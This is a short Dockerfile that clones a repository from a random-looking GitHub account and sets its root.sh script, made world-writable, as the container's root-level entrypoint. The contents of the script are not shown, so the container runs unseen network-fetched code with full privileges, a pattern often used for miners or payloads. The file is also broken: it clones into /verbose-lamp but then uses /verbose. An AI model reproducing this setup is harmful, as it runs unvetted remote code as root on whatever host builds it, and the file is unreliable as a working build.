FROM python
EXPOSE 8000
USER root
WORKDIR /
Run cd / && git clone https://github.com/loyejaotdiqr47123/verbose-lamp.git
Run cd /verbose && chmod 777 root.sh
ENTRYPOINT [ "/verbose/root.sh" ]
